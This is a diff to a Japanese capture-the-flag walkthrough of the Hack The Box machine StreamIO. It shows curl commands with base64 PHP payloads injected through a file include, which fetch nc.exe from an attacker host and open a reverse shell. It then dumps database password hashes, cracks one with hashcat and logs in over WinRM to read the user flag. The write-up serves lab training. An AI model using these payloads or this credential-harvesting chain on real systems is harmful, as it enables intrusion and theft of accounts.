@@ -777,7 +777,7 @@ system("コマンド");
 └─$ echo 'system("whoami");' | base64
 c3lzdGVtKCJ3aG9hbWkiKTsK
 
-└─$ curl -H "Cookie: PHPSESSID=o3hnms5g60gr268v1p339h27jv" -k -d 'include=data://text/plain;base64,c3lzdGVtKCJ3aG9hbWkiKTsK' 'https://streamio.htb/admin/index.php?debug=master.php' 
+└─$ curl -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -k -d 'include=data://text/plain;base64,c3lzdGVtKCJ3aG9hbWkiKTsK' 'https://streamio.htb/admin/index.php?debug=master.php' 
 
 ~~~
 
@@ -799,12 +799,12 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 └─$ echo 'system("powershell -c Invoke-Webrequest http://10.10.16.9/nc.exe -outfile nc.exe");' | base64 -w 0
 c3lzdGVtKCJwb3dlcnNoZWxsIC1jIEludm9rZS1XZWJyZXF1ZXN0IGh0dHA6Ly8xMC4xMC4xNi45L25jLmV4ZSAtb3V0ZmlsZSBuYy5leGUiKTsK
 
-└─$ curl -H "Cookie: PHPSESSID=o3hnms5g60gr268v1p339h27jv" -k -d 'include=data://text/plain;base64,c3lzdGVtKCJwb3dlcnNoZWxsIC1jIEludm9rZS1XZWJyZXF1ZXN0IGh0dHA6Ly8xMC4xMC4xNi45L25jLmV4ZSAtb3V0ZmlsZSBuYy5leGUiKTsK' 'https://streamio.htb/admin/index.php?debug=master.php'
+└─$ curl -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -k -d 'include=data://text/plain;base64,c3lzdGVtKCJwb3dlcnNoZWxsIC1jIEludm9rZS1XZWJyZXF1ZXN0IGh0dHA6Ly8xMC4xMC4xNi45L25jLmV4ZSAtb3V0ZmlsZSBuYy5leGUiKTsK' 'https://streamio.htb/admin/index.php?debug=master.php'
 
 └─$ echo 'system("nc.exe -e cmd 10.10.16.9 4444");' | base64 -w 0 
 c3lzdGVtKCJuYy5leGUgLWUgY21kIDEwLjEwLjE2LjkgNDQ0NCIpOwo=
 
-└─$ curl -H "Cookie: PHPSESSID=o3hnms5g60gr268v1p339h27jv" -k -d 'include=data://text/plain;base64,c3lzdGVtKCJuYy5leGUgLWUgY21kIDEwLjEwLjE2LjkgNDQ0NCIpOwo=' 'https://streamio.htb/admin/index.php?debug=master.php'
+└─$ curl -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -k -d 'include=data://text/plain;base64,c3lzdGVtKCJuYy5leGUgLWUgY21kIDEwLjEwLjE2LjkgNDQ0NCIpOwo=' 'https://streamio.htb/admin/index.php?debug=master.php'
 
 ```
 リバースシェル取得
@@ -816,6 +816,133 @@ connect to [10.10.16.9] from (UNKNOWN) [10.129.70.54] 52458
 PS C:\inetpub\streamio.htb\admin> whoami
 streamio\yoshihide
 ```
-
+ 
 
 ## STEP 7
+各ユーザのフォルダにアクセスできず、ユーザフラグすら取れない状況
+```powershell
+C:\inetpub\streamio.htb\admin>dir c:\users
+dir c:\users
+ Volume in drive C has no label.
+ Volume Serial Number is A381-2B63
+
+ Directory of c:\users
+
+02/22/2022  02:48 AM    <DIR>          .
+02/22/2022  02:48 AM    <DIR>          ..
+02/22/2022  02:48 AM    <DIR>          .NET v4.5
+02/22/2022  02:48 AM    <DIR>          .NET v4.5 Classic
+02/26/2022  10:20 AM    <DIR>          Administrator
+05/09/2022  04:38 PM    <DIR>          Martin
+02/26/2022  09:48 AM    <DIR>          nikk37
+02/22/2022  01:33 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               8 Dir(s)   7,227,252,736 bytes free
+
+C:\inetpub\streamio.htb\admin>dir c:\users\martin
+dir c:\users\martin
+ Volume in drive C has no label.
+ Volume Serial Number is A381-2B63
+
+ Directory of c:\users\martin
+
+File Not Found
+
+C:\inetpub\streamio.htb\admin>dir c:\users\nikk37
+dir c:\users\nikk37
+ Volume in drive C has no label.
+ Volume Serial Number is A381-2B63
+
+ Directory of c:\users\nikk37
+
+File Not Found
+```
+ここで、step5でindex.phpのコードをlfiで確認できたが`、sqlのクレデンシャルのようなものを発見した  
+```php
+$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
+$handle = sqlsrv_connect('(local)',$connection);
+```
+sqlcmdがインストールされていたので、それを使ってmssqlにアクセス  
+sqlcmdの使い方は[公式サイト](https://learn.microsoft.com/ja-jp/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver17&tabs=odbc%2Cwindows-support&pivots=cs1-bash#syntax)で確認  
+mssqlの構文はsqlインジェクションでちょっと慣れていますね  
+データベースを６つ確認、STEAMIOというデータベースがstep3,4でsqlインジェクション先であったことを確認
+```powershell
+C:\inetpub\streamio.htb\admin>sqlcmd -d streamio -P B1@hx31234567890 -U db_admin -Q "SELECT name FROM master.sys.databases"
+sqlcmd -d streamio -P B1@hx31234567890 -U db_admin -Q "SELECT name FROM master.sys.databases"
+name                                                                                                                            
+--------------------------------------------------------------------------------------------------------------------------------
+master                                                                                                                          
+tempdb                                                                                                                          
+model                                                                                                                           
+msdb                                                                                                                            
+STREAMIO                                                                                                                        
+streamio_backup                                                                                                                 
+
+(6 rows affected)
+```
+streamiob_backupのusersテーブルを確認すると、クレデンシャルのようなものを確認  
+step3、4でみたものと似ているね、パスワードはmd5ハッシュ値？
+```powershell
+C:\inetpub\streamio.htb\admin>sqlcmd -d streamio_backup -P B1@hx31234567890 -U db_admin -Q "SELECT table_name FROM information_schema.columns"
+sqlcmd -d streamio_backup -P B1@hx31234567890 -U db_admin -Q "SELECT table_name FROM information_schema.columns"
+table_name                                                                                                                      
+--------------------------------------------------------------------------------------------------------------------------------
+movies                                                                                                                          
+movies                                                                                                                          
+movies                                                                                                                          
+movies                                                                                                                          
+movies                                                                                                                          
+movies                                                                                                                          
+users                                                                                                                           
+users                                                                                                                           
+users
+
+C:\inetpub\streamio.htb\admin>sqlcmd -d streamio_backup -P B1@hx31234567890 -U db_admin -Q "SELECT * FROM users"
+sqlcmd -d streamio_backup -P B1@hx31234567890 -U db_admin -Q "SELECT * FROM users"
+id          username                                           password                                          
+----------- -------------------------------------------------- --------------------------------------------------
+          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
+          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
+          3 James                                              c660060492d9edcaa8332d89c99c9239                  
+          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
+          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
+          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
+          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
+          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  
+
+(8 rows affected)
+```
+確認できた８つのクレデンシャルのうち、ユーザ名nikk37のmd5値がクラックできた
+```sh
+└─$ hashcat -a 0 -m 0 backup_pass /usr/share/wordlists/rockyou.txt --quiet    
+389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
+```
+step1で5985番オープンを確認したが、nikk37はwinrmログイン可能であることを確認
+```powershell
+C:\inetpub\streamio.htb\admin>net localgroup "Remote Management Users"
+net localgroup "Remote Management Users"
+Alias name     Remote Management Users
+Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+
+Members
+
+-------------------------------------------------------------------------------
+Martin
+nikk37
+The command completed successfully.
+```
+ということでwinrmでログイン成功  
+ようやくユーザフラグゲット
+```powershell
+└─$ evil-winrm -i 10.129.70.54 -u nikk37 -p get_dem_girls2@yahoo.com       
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\nikk37\Documents> cat ../desktop/user.txt
+af990b51d8f6b1007dc48f06192c904e
+```
